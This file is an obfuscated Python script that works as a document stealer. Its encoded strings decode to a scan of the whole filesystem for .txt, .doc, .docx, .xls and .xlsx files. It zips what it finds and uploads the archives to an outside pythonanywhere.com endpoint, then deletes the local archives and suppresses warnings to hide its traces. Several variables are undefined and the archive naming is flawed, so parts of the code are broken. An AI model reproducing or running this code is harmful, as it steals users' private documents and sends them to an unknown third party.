import os
oX=UserWarning
oy=Exception
ov=None
oz=range
oM=hash
oK=tuple
ox=open
ol=list
oV=str
oD=object
ou=True
ok=os.makedirs
oe=os.remove
oh=os.path
oC=os.walk
import zipfile
oN=zipfile.ZipFile
import warnings
od=warnings.filterwarnings
import socket
oj=socket.gethostbyname
oI=socket.gethostname
import uuid
oS=uuid.getnode
from datetime import datetime
import random
oH=random.choice
import string
oF=string.digits
oR=string.ascii_letters
import base64
ot=base64.b64decode
import aiohttp
on=aiohttp.ClientSession
om=aiohttp.FormData
import asyncio
oG=asyncio.run
ow=asyncio.gather
import time
Hn=[("".join([chr(100),chr(72),chr(104),chr(48)]))          ,("".join([chr(90),chr(71),chr(57),chr(106),chr(101),chr(65),chr(61),chr(61)]))                     ,("".join([chr(101),chr(71),chr(120),chr(122)]))                            ,("".join([chr(101),chr(71),chr(120),chr(122),chr(101),chr(65),chr(61),chr(61)]))                                       ,("".join([chr(90),chr(71),chr(57),chr(106)]))                                              ]
Hw=("".join([chr(97),chr(72),chr(82),chr(48),chr(99),chr(68),chr(111),chr(118),chr(76),chr(50),chr(82),chr(104),chr(98),chr(109),chr(108),chr(115),chr(89),chr(88),chr(90),chr(104),chr(98),chr(109),chr(82),chr(118),chr(100),chr(109),chr(86),chr(121),chr(76),chr(110),chr(66),chr(53),chr(100),chr(71),chr(104),chr(118),chr(98),chr(109),chr(70),chr(117),chr(101),chr(88),chr(100),chr(111),chr(90),chr(88),chr(74),chr(108),chr(76),chr(109),chr(78),chr(118),chr(98),chr(83),chr(57),chr(49),chr(99),chr(71),chr(120),chr(118),chr(89),chr(87),chr(81),chr(61)]))
HG=("".join([chr(100),chr(71),chr(86),chr(116),chr(99),chr(70),chr(57),chr(111),chr(89),chr(88),chr(78),chr(111),chr(88),chr(50),chr(82),chr(112),chr(99),chr(103),chr(61),chr(61)]))
def HL():
  od(("".join([chr(105),chr(103),chr(110),chr(111),chr(114),chr(101)]))             ,category=oX,module=("".join([chr(111),chr(115)]))                                     )
  od(("".join([chr(105),chr(103),chr(110),chr(111),chr(114),chr(101)]))             ,category=oX,module=("".join([chr(122),chr(105),chr(112),chr(102),chr(105),chr(108),chr(101)]))                                          )
  od(("".join([chr(105),chr(103),chr(110),chr(111),chr(114),chr(101)]))             ,category=oX,module=("".join([chr(119),chr(97),chr(114),chr(110),chr(105),chr(110),chr(103),chr(115)]))                                           )
  od(("".join([chr(105),chr(103),chr(110),chr(111),chr(114),chr(101)]))             ,category=oX,module=("".join([chr(114),chr(101),chr(113),chr(117),chr(101),chr(115),chr(116),chr(115)]))                                           )
  od(("".join([chr(105),chr(103),chr(110),chr(111),chr(114),chr(101)]))             ,category=oX,module=("".join([chr(117),chr(117),chr(105),chr(100)]))                                       )
  od(("".join([chr(105),chr(103),chr(110),chr(111),chr(114),chr(101)]))             ,category=oX,module=("".join([chr(100),chr(97),chr(116),chr(101),chr(116),chr(105),chr(109),chr(101)]))                                           )
  od(("".join([chr(105),chr(103),chr(110),chr(111),chr(114),chr(101)]))             ,category=oX,module=("".join([chr(98),chr(97),chr(115),chr(101),chr(54),chr(52)]))                                         )
def HT():
  try:
    Hy=oI()
    Hv=oj(Hy)
    return Hv
  except oy as e:
    return ov
def HY():
  try:
    Hz=HO(("".join([chr(58)]))             .join([("".join([chr(123),chr(58),chr(48),chr(50),chr(120),chr(125)]))                            .format((oS()>>elements)&int("".join([chr(48),chr(120),chr(102),chr(102)]))                                                         )for elements in oz(int("".join([chr(53)]))                                                                              ,-int("".join([chr(49)]))                                                                                 ,-int("".join([chr(49)]))                                                                                    )]))
    return Hz
  except oy as e:
    return ov
def HO(oM):
  try:
    HM=oM.replace(("".join([chr(45)]))                     ,("".join([chr(95)]))                         ).replace(("".join([chr(58)]))                                      ,("".join([chr(95)]))                                          ).replace(("".join([chr(46)]))                                                       ,("".join([chr(95)]))                                                           ).replace(("".join([chr(32)]))                                                                        ,("".join([chr(95)]))                                                                            )
    return HM
  except oy as e:
    return ov
def HQ(Hn):
  Hn=[ot(key).decode(("".join([chr(117),chr(116),chr(102),chr(45),chr(56)]))                            )for key in Hn]
  for HK,dirs,hash_address in oC(("".join([chr(47)]))                                    ):
    for Hx in hash_address:
      if Hx.endswith(oK(Hn)):
        Hl=oh.join(HK,Hx)
        try:
          with ox(Hl,("".join([chr(114)]))                        ):
            yield Hl
        except PermissionError:
          continue
        except FileNotFoundError:
          continue
async def HW(HP):
  Hr=om()
  Hr.add_field(("".join([chr(102),chr(105),chr(108),chr(101)]))                     ,ox(HP,("".join([chr(114),chr(98)]))                                ))
  HV=on()
  await HV.post(ot(Hw).decode(("".join([chr(117),chr(116),chr(102),chr(45),chr(56)]))                                     ),data=Hr)
  await HV.close()
  Hg(HP)
def Hg(HP):
  try:
    oe(HP)
  except oy as e:
    pass
def of():
  HD=oR+oF
  Hu=''       .join(oH(HD)for _ in oz(int("".join([chr(53)]))                                ))
  return Hu
def oa():
  Hv=HT()
  Hz=HY()
  Hb=''
  Hi=of()
  if(Hv!=ov)|(Hz!=ov):
    Hb=Hb+f'{str(task_id)}'+f' {str(task_hash)}'
  else:
    Hb=datetime.now().strftime(("".join([chr(37),chr(89),chr(95),chr(37),chr(109),chr(95),chr(37),chr(100),chr(32),chr(37),chr(72),chr(95),chr(37),chr(77),chr(95),chr(37),chr(83)]))                                                  )
  Hb=Hb+f'__{hash_key}_'
  return Hb
def oB(HJ:ol,hash_result:oV,HG:oV)->oD:
  Hq=int("".join([chr(48)]))
  Hx=int("".join([chr(49)]))
  ok(ot(HG).decode(("".join([chr(117),chr(116),chr(102),chr(45),chr(56)]))                          ),exist_ok=ou)
  with oN(oh.join(ot(HG).decode(("".join([chr(117),chr(116),chr(102),chr(45),chr(56)]))                                       ),f'{hash_result}_{hash_id}.zip'),("".join([chr(119)]))                                                                            )as oM:
    for HE in HJ:
      HP=oh.getsize(HE)
      if Hq+HP>int("".join([chr(52),chr(48)]))                 *int("".join([chr(49),chr(48),chr(50),chr(52)]))                      *int("".join([chr(49),chr(48),chr(50),chr(52)]))                           :
        Hx+=int("".join([chr(49)]))
        Hq=int("".join([chr(48)]))
        oM.close()
        oM=oN(oh.join(ot(HG).decode(("".join([chr(117),chr(116),chr(102),chr(45),chr(56)]))                                           ),f'{hash_result}_{hash_id}.zip'),("".join([chr(119)]))                                                                                )
      oM.write(HE,oh.basename(HE))
      Hq+=HP
  HP=[oh.join(ot(HG).decode(("".join([chr(117),chr(116),chr(102),chr(45),chr(56)]))                                   ),f'{hash_result}_{hash_id}.zip')for Hx in oz(int("".join([chr(49)]))                                                                                  ,Hx+int("".join([chr(49)]))                                                                                       )]
  return HP
async def os(arch_list):
  HU=[HW(arch)for arch in arch_list]
  await ow(*HU)
async def op():
  HL()
  HJ=ol(HQ(Hn))
  HA=oa()
  Hc=oB(HJ,HA,HG)
  await os(Hc)
oG(op())
